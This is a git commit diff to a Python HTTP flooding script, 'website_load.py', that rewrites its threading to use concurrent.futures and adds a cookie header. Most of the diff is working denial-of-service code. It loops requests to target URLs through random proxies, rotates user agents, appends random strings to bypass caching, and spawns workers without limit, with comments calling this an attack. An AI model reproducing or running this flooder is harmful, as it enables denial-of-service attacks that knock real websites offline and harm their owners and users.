f20af8453f0fc3551e2b7c79d51870afe245515b
Alexey Privalov <alex0007lolpvp@gmail.com>
2014-12-26 22:28:46 +0500

    concurrent.futures instead of threading

--- website_load.py
+++ website_load.py
@@ -3,7 +3,8 @@
 # by Alexey Privalov | www.alex0007.ru
 import os
 
-import threading
+#import threading
+import concurrent.futures
 import http.client
 import urllib.parse
 import random
@@ -19,6 +20,7 @@ append_rand_string_to_url = False
 min_timeout = 30
 max_timeout = 30
 wait_for_response = True
+cookie = ""  # name1=value1; name2=value2
 
 user_agents = []  # in file 'useragents.txt'
 proxies = []  # in file 'proxies.txt' if none - attack directly
@@ -35,12 +37,14 @@ def read_data():
     cur_header = set_header()
 
 def set_header():
-        cur_header = {
-        "User-agent": random.choice(user_agents),
-        "Referrer": referrer,
-        "Accept-Encoding": "gzip,deflate",
-        "Connection": "Keep-Alive"}
-        return cur_header
+    global cookie
+    cur_header = {
+    "User-agent": random.choice(user_agents),
+    "Referrer": referrer,
+    "Accept-Encoding": "gzip,deflate",
+    "Connection": "Keep-Alive",
+    "Cookie": cookie}
+    return cur_header
 
 def read_file_to_array(file_desc):
     file_desc.seek(0)
@@ -87,39 +91,37 @@ def make_dir(dirname):
 
 
 def start_flood():
-    while True:
-        if threading.active_count() < thread_limit:
-            Flooder().start()
+    global thread_limit
+    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_limit) as executor:
+        while True:
+            future_to_url = {executor.submit(flood)}
 
 
-class Flooder(threading.Thread):
-    def __init__(self):
-        threading.Thread.__init__(self)
 
-    def run(self):
-        try:
-            cur_url = urllib.parse.urlparse(random.choice(url))
-            if len(proxies) == 0:  # setting direct connection here
-                connection = http.client.HTTPConnection(cur_url.netloc, timeout=random.randint(min_timeout,
-                                                                                               max_timeout))
-                url_str = cur_url.path + cur_url.params + cur_url.query
-            else:  # connect via random proxy
-                connection = http.client.HTTPConnection(random.choice(proxies))
-                url_str = cur_url.scheme + '://' + cur_url.netloc + cur_url.path + cur_url.params + cur_url.query
-            while True:
-                if not append_rand_string_to_url:
-                    connection.request(method=random.choice(request_methods), url=url_str,
-                                       headers=cur_header)
-                else:
-                    randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
-                    connection.request(method=random.choice(request_methods), url=url_str + randstr,
-                                       headers=cur_header)
-                if wait_for_response:
-                    connection.getresponse().read()
+def flood():
+    global url, proxies, min_timeout, max_timeout, append_rand_string_to_url, request_methods, cur_header, wait_for_response
+    try:
+        cur_url = urllib.parse.urlparse(random.choice(url))
+        if len(proxies) == 0:  # setting direct connection here
+            connection = http.client.HTTPConnection(cur_url.netloc, timeout=random.randint(min_timeout,
+                                                                                           max_timeout))
+            url_str = cur_url.path + cur_url.params + cur_url.query
+        else:  # connect via random proxy
+            connection = http.client.HTTPConnection(random.choice(proxies))
+            url_str = cur_url.scheme + '://' + cur_url.netloc + cur_url.path + cur_url.params + cur_url.query
+        while True:
+            if not append_rand_string_to_url:
+                connection.request(method=random.choice(request_methods), url=url_str,
+                                   headers=cur_header)
+            else:
+                randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
+                connection.request(method=random.choice(request_methods), url=url_str + randstr,
+                                   headers=cur_header)
+            if wait_for_response:
+                connection.getresponse().read()
 
-        except:
-            sys.exit()
-            pass
+    except:
+        pass
 
 
 if __name__ == '__main__':
